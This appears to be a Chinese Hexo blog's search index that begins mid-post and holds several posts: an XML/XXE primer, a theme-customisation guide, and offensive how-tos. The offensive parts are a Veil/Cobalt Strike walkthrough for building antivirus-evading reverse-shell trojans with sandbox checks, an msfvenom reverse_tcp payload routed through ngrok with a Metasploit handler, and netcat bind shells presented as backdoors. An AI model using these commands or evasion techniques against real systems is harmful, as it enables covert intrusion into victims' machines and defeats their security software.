HOSTNAME X #只有计算机名为hostname的值时才执行INJECT_METHOD Virtual #Virtual or HeapMINPROCS X #设置只有环境进程数满足时执行PROCCHECK FALSE #只有运行环境的进程中没有虚拟机进程时才会执行payload（指定目标环境 反沙箱的方式）PROCESSORS X #指定核心数的机器中才会执行payload（指定目标环境 反沙箱的方式）RAMCHECK FALSE #只在运行环境的内存为3G以上时才会执行payload（指定目标环境 反沙箱的方式）SLEEP X #休眠10秒 以检测是否运行过程中被加速（反沙箱)USERNAME X #只有在当前用户名正确的机器中才执行payloadUSERPROMPT FALSE #受害者计算机只有加入Comp域中时，才会执行payload（指定目标环境 反沙箱的方式）UTCCHECK Y #只在运行环境的系统使用UTC时间时，才会执行payload 生成payload1[go/shellcode_inject/virtual&gt;&gt;]: generate 此时需要我们选择shellcode，我用cs生成 Attacks -&gt; Packages -&gt; Payload Generator Windows/beacon_http/reverse/http 复制cs的payload到veil中 12[&gt;] Please enter the base name for output files (default is payload): test生成木马 test.exe即为注入内存的免杀木马。 测试卑微，只能过360，腾讯哈勃没过得去。正常用没问题大家尽量不要用virustotal去做测试，这个会总合杀毒软件并将样本提交给杀毒软件。也就是说只能用一次。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>免杀，payload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML和XXE基础]]></title>
    <url>%2F2019%2F09%2F29%2FXML%E5%92%8CXXE%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[XML简介 XML 被设计用来传输和存储数据。 HTML 被设计用来显示数据。 XML语法所有XML都必须要有关闭标签。1&lt;note&gt; this's note example &lt;/note&gt; 所有XML的标签对大小写敏感XML 标签对大小写敏感。在 XML 中，标签 与标签 是不同的。必须使用相同的大小写来编写打开标签和关闭标签 123&lt;Message&gt;这是错误的。&lt;/message&gt;&lt;message&gt;这是正确的。&lt;/message&gt; XML的属性值必须加引号1234567&lt;!-- wrong example --&gt;&lt;note data=8/2/16/&gt; &lt;/note&gt;&lt;!-- right example --&gt;&lt;note data="08/02/16"&gt; &lt;/note&gt; 在 XML 中， 5个实体引用来代替符号： 实体引用 符号 中文解释 &amp;it ＜ 小于号 &amp;gt ＞ 大于号 &amp;amp &amp; 和号 &amp;apos ‘ 单引号 &amp;quot “ 双引号 XML结构- XML文档结构包括DTD文档类型定义和文档元素信息。1234567&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; #第一行是 XML 声明 &lt;note&gt; #第二行根元素&lt;note&gt;&lt;to&gt;George&lt;/to&gt; #3-6描述根的4个子元素（to,from,heading以及body）&lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don't forget the meeting!&lt;/body&gt; &lt;/note&gt; #最后闭合根元素&lt;note&gt;结束 XML DTD DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： 1234567891011121314&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don't forget me this weekend&lt;/body&gt;&lt;/note&gt; DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中 1234567891011121314151617&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;&lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;&lt;/note&gt;这是包含 DTD 的 "note.dtd" 文件：&lt;!-- note.dtd &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;--&gt; DTD中的实体实体是用于定义引用普通文本或特殊字符的快捷方式的变量。 实体引用是对实体的引用。 实体可在内部或外部进行声明。 内部实体声明12345678DTD 实例:&lt;!ENTITY writer "Donald Duck."&gt;&lt;!ENTITY copyright "Copyright runoob.com"&gt;XML 实例：&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; 外部实体声明12345678DTD 实例:&lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;&lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;XML example:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;]]></content>
      <categories>
        <category>owasp</category>
      </categories>
      <tags>
        <tag>owasp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主题美化]]></title>
    <url>%2F2019%2F09%2F27%2Fhexo%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[环境准备 hexo3的版本 next7的版本 部署好github 配置Hexo更换主题12345# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/-theme: landscape+theme: next 站点信息12345678# Sitetitle: Alpha的小站subtitle: 一个自觉还有很多路要走的孩子，想做的更好。description: 够努力才会越幸运keywords: Linux,CTF,漏洞复现,环境搭建,工具使用author: wanglanguage: zh-CNtimezone: 仓库1234deploy: type: git repo: git@github.com:alpha302/alpha302.github.io.git branch: master 头像1234567favicon: small: /images/favicon.ico medium: /images/favicon.ico apple_touch_icon: /favicon.ico safari_pinned_tab: /favicon.ico #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml 知识共享12345creative_commons: license: by-nc-sa sidebar: true post: true language: zh-CN goole站点登陆goole网站站长,在“网址前缀”栏输入你的博客网址。验证所有权选择HTML标记，将content=”x7LMhrHG*****“复制到主题配置文件. 1google_site_verification: x7LMhrHG**************** 侧栏图标123456menu: home: / || home categories: /categories/ || th tags: /tags/ || tags archives: /archives/ || archive about: /about/ || user 侧栏数目123menu_settings: icons: true badges: true 主题风格1234# Schemes##scheme: Mistscheme: Pisces#scheme: Gemini 移除next页脚123456789101112powered: # Hexo link (Powered by Hexo). enable: false # Version info of Hexo after Hexo link (vX.X.X). version: truetheme: # Theme &amp; scheme info link (Theme - NexT.scheme). enable: false # Version info of NexT after scheme info (vX.X.X). version: true` 图标链接1234social: GitHub: https://github.com/alpha302/alpha302.github.io.git || github E-Mail: mailto:howtime4096@gmail.com || envelope Telegram: https://t.me/howtime4096 || telegram 大头像1234567891011avatar: # In theme directory (source/images): /images/avatar.gif # In site directory (source/uploads): /uploads/avatar.gif # You can also use other linking images. url: /images/headicon.png # 圆角头像 rounded: true # 不透明度 opacity: 1 # 鼠标指示旋转头像 rotated: false 收起文章详情123auto_excerpt: enable: true length: 150 文章统计，文字阅读时长3步 1$ npm install hexo-symbols-count-time --save 12345678# Post wordcount display settings 主题配置文件# Dependencies: https://github.com/theme-next/hexo-symbols-count-timesymbols_count_time: separated_meta: true item_text_post: true item_text_total: false awl: 4 wpm: 275 12345symbols_count_time: symbols: true time: true total_symbols: true total_time: true 代码块123456789101112codeblock: # Code Highlight theme # Available values: normal | night | night eighties | night blue | night bright # See: https://github.com/chriskempson/tomorrow-theme highlight_theme: normal # Add copy button on codeblock copy_button: enable: true # Show text copy result. show_result: true # Available values: default | flat | mac style: mac back2top123456back2top: enable: true # Back to top in sidebar. sidebar: true # Scroll percent label in b2t button. scrollpercent: true bookmark1234567bookmark: enable: true # Customize the color of the bookmark. color: "#222" # If auto, save the reading progress when closing the page or clicking the bookmark-icon. # If manual, only save it by clicking the bookmark-icon. save: auto 第三方插件gitalk在github上申请一个oAuth Apps 获取github_id和secret。 123456789101112gitalk: enable: true github_id: alpha302 # Github repo owner repo: gitment-comments # Repository name to store issues client_id: xxxxx # Github Application Client ID client_secret: xxxxxx # Github Application Client Secret admin_user: alpha302 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues distraction_free_mode: true # Facebook-like distraction free mode # Gitalk's display language depends on user's browser or system environment # If you want everyone visiting your site to see a uniform language, you can set a force language value # Available values: en | es-ES | fr | ru | zh-CN | zh-TW language: zh-CN 不算子访客统计123456789# 访客人数统计busuanzi_count: enable: true total_visitors: true total_visitors_icon: user total_views: true total_views_icon: eye post_views: true post_views_icon: eye 本地搜索1234567891011local_search: enable: true # If auto, trigger search by changing input. # If manual, trigger search by pressing enter key or search button. trigger: auto # Show top n results per article, show all results by setting to -1 top_n_per_article: 1 # Unescape html strings to the readable one. unescape: false # Preload the search data when the page loads. preload: false 动态文章背景123456789git clone https://github.com/theme-next/theme-next-three source/lib/three# JavaScript 3D library.# Dependencies: https://github.com/theme-next/theme-next-threethree: enable: true delay: false # Set true to further delay loading three_waves: false canvas_lines: false canvas_sphere: true 点击出现爱心复制页面中的代码，在路径blog/themes/next/source/js/src/中新建love.js文件，将复制的代码粘贴到该文件中。 12/*网页鼠标点击特效（爱心）*/!function (e, t, a) &#123;function r() &#123;for (var e = 0; e &lt; s.length; e++) s[e].alpha &lt;= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");requestAnimationFrame(r)&#125;function n() &#123;var t = "function" == typeof e.onclick &amp;&amp; e.onclick;e.onclick = function (e) &#123;t &amp;&amp; t(), o(e)&#125;&#125;function o(e) &#123;var a = t.createElement("div");a.className = "heart", s.push(&#123;el: a,x: e.clientX - 5,y: e.clientY - 5,scale: 1,alpha: 1,color: c()&#125;), t.body.appendChild(a)&#125;function i(e) &#123;var a = t.createElement("style");a.type = "text/css";try &#123;a.appendChild(t.createTextNode(e))&#125; catch (t) &#123;a.styleSheet.cssText = e&#125;t.getElementsByTagName("head")[0].appendChild(a)&#125;function c() &#123;return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"&#125;var s = [];e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) &#123;setTimeout(e, 1e3 / 60)&#125;, i(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"), n(), r()&#125;(window, document); 打开/blog/themes/next/layout/_layout.swig文件，在该文件的最后增加以下代码 12&lt;!-- 页面点击小红心 --&gt;&lt;script type="text/javascript" src="/js/src/love.js"&gt;&lt;/script&gt; 添加看板娘1npm install --save hexo-helper-live2d 在站点配置文件下配置 123456789101112131415161718live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-shizuku display: position: right width: 150 height: 300 mobile: show: true react: opacity: 0.7 3种高配版 增加站点运行时间在/blog/themes/next/layout/_partials/footer.swig最后添加如下代码 1234567891011121314151617181920212223242526&lt;div id="days"&gt;&lt;/div&gt;&lt;script&gt;function show_date_time()&#123; window.setTimeout("show_date_time()", 1000); BirthDay=new Date("04/17/2017 15:13:14");//修改为自己的blog建站时间 today=new Date(); timeold=(today.getTime()-BirthDay.getTime()); sectimeold=timeold/1000 secondsold=Math.floor(sectimeold); msPerDay=24*60*60*1000 e_daysold=timeold/msPerDay daysold=Math.floor(e_daysold); e_hrsold=(e_daysold-daysold)*24; hrsold=setzero(Math.floor(e_hrsold)); e_minsold=(e_hrsold-hrsold)*60; minsold=setzero(Math.floor((e_hrsold-hrsold)*60)); seconds=setzero(Math.floor((e_minsold-minsold)*60)); document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";&#125;function setzero(i)&#123; if (i&lt;10) &#123;i="0" + i&#125;; return i;&#125;show_date_time();&lt;/script&gt; 布局配置配置背景12345678910111213141516171819blog\themes\next\source\css\_common\scaffolding\basebody &#123; position: relative; // Required by scrollspy font-family: $font-family-base; font-size: $font-size-small; line-height: $line-height-base; color: $text-color; background:url(/images/background.png); background-repeat: no-repeat; background-attachment:fixed; background-position:50% 50%; background-size: cover; -webkit-background-size: cover; -o-background-size: cover; -moz-background-size: cover; -ms-background-size: cover; +tablet-mobile() &#123; padding-right: 0 !important; &#125; +desktop-large() &#123; font-size: $font-size-medium; &#125;&#125; 圆角 主板块blog\themes\next\source\css_schemes\Pisces_layout.styl 12345678910111213141516171819202122.content-wrap &#123; float: right; box-sizing: border-box; padding: $content-desktop-padding; width: $content-wrap; background: rgba(255,255,255,0.5); min-height: 700px; box-shadow: 16px; border-radius: 16px; +tablet() &#123; width: 100%; padding: 20px; border-radius: 16px; &#125; +mobile() &#123; width: 100%; padding: 20px; min-height: auto; border-radius: 16px; &#125;&#125; 侧边blog\themes\next\source\css_schemes\Pisces_sidebar.styl 12345678910111213141516171819.sidebar-inner &#123; //padding: 20px 10px 0; box-sizing: border-box; width: $sidebar-desktop; color: $text-color; background: rgba(255,255,255,0.5); box-shadow: $box-shadow; border-radius: 16px; if (hexo-config('motion.enable') and hexo-config('motion.transition.sidebar')) &#123; opacity: 0; &#125; &amp;.affix &#123; position: fixed; top: $sidebar-offset; &#125; &amp;.affix-bottom &#123; position: absolute; &#125;&#125; blog\themes\next\source\css_common\components\back-to-top.styl 1234567891011121314151617181920.back-to-top &#123; visibility: hidden; margin: (20px - $sidebar-offset) -10px -20px; background: rgba(255,255,255,0.5); font-size: $b2t-font-size; opacity: $b2t-opacity; cursor: pointer; text-align: center; border-radius: 16px; &amp;:hover &#123; opacity: $b2t-opacity-hover; &#125; +tablet-mobile() &#123; hide() if not hexo-config('sidebar.onmobile'); &#125; &amp;.back-to-top-on &#123; visibility: visible; the-transition(); &#125;&#125; blog\themes\next\source\css_schemes\Pisces_layout.styl 12345678910111213.sidebar &#123; position: static; float: left; margin-left: -100%; width: $sidebar-desktop; background: rgba(255,255,255,0.5); box-shadow: none border-radius: 16px; +tablet-mobile() &#123; hide(); &#125;&#125;]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vps配置ngrok反向代理]]></title>
    <url>%2F2019%2F09%2F13%2Fvps%E9%85%8D%E7%BD%AEngrok%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示 1 起因:自己搭建的ngrok挂掉了 2 更换ngrok.cc的客户端2.1 开通一个免费的隧道。 2.2 开通你的隧道 隧道协议选tcp，之后要用metasploit结合ngrok 隧道名称随意 端口选择只要不是服务器端口就好 本地端口选择kali 的内网地址 2.3管理隧道 下载客户端 记录好隧道id 2.4 kali下安装客户端测试123#安装路径下执行root@kali:~# ./sunny clientid id#出现online表明成功 现在可以启用web，打开127.0.0.1:4040查看管理。需要设置apache2的端口为端口为kali内的端口，开启apache2的服务 3 测试metasploit结合ngrok内网穿透3.1 生成木马（未免杀）1msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfen*** LPORT=123** -f exe &gt; /root/Desktop/ngrok.exe 3.2 使用Metasploit进行测试12345use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.200.128(Kali的Linux内网IP)set lport 1000 (隧道的端口号)run 成功获取shell，不同网段。 4 端口选择以下为服务端口，不可用选用]]></content>
      <categories>
        <category>vps</category>
      </categories>
      <tags>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Netcat]]></title>
    <url>%2F2019%2F03%2F27%2FNetcat%2F</url>
    <content type="text"><![CDATA[nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀 1.netcat常用参数12345678910111213141516-l:设置netcat处于监听状态等待连接-L：设置netcat处于监听状态等待连接，当客户端断开，服务端依旧回到等待状态-p：本地监听端口号-v：显示端口信息，如果使用-vv的话，则显示更加详细的端口信息-e：执行某个程序，如cmd.exe-n:只识别IP地址，不对目标进行DNS解析-u：使用UDP模式（nc默认使用tcp连接）-z：zero I/O模式，专用端口扫描。表示对目标IP发送的数据表中不包含payload，加快扫描速度-w1:超时设置1秒-d:脱离命令窗口，在后台运行，常用于后门的建立过程-G:gateway 设置网关，用于内网突破限制-g：num，路由调数-o :file,设置传输16进制的数据-s:addr,设置netcat源地址，隐藏自己的ip地址-t：恢复telnet的请求数据包-r：设置netcat随机化的端口号 2.基础使用2.1 简单通信12345678一般通信:创建服务端：nc -l -p 4444创建客户端：nc 192.168.59.138 4444此时并不能对服务端进行命令执行返回shell的通信：服务端：nc -l -p 4444 -e cmd.exe客户器端可以对服务端执行cmd的命令 注：我是在同一台电脑里进行nc实验的，客户端的ip应填服务器的ip。 2.2 文件传输12345创建服务端：nc -l -p 4444 &gt; outfile 服务端接受一个文件并重定向到 outfile创建客户端：nc 192.168.59.138 4444 &lt; infile 实现了客户端向服务器端传输文件 3.内网探测3.1 端口扫描12获得目标的权限之后，目标没有途径可以去进行内网探测，此时可以用nc对内网ip和端口进行扫描-nc -v -n -z -w1 192.168.59.135 1-65535 3.2 Banner抓取12-echo “ ” | -nc -v -n -z -w1 192.168.59.135 1-65535banner 信息来表示欢迎语，其中会包含一些敏感信息，所以获取 banner 也属于信息搜集的范畴。 4.建立后门 原理：netcat一切数据通过标准输入/输出流实现的，所以可以利用netcat的命令进行后门的简历，并传输结果信息。 4.1 对windows建立后门1-nc -l -p 4444 -e cmd.exe 4.2 对linux建立后门1-nc -l -p 4444 -e /bin/bash 5.netcat连接转发(端口转发)突破某些特殊情况下的连接限制 123- echo nc [target][IP] &gt; delay.batdelay.bat nc ip port-nc -l -p [localport] -e delay.bat 6.windows下载netcat点这 windows下选择netcat 1.11，保存即可。关闭杀毒软件或加入白名单，将nc.exe拖入cmd中即可运行netcat。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
</search>
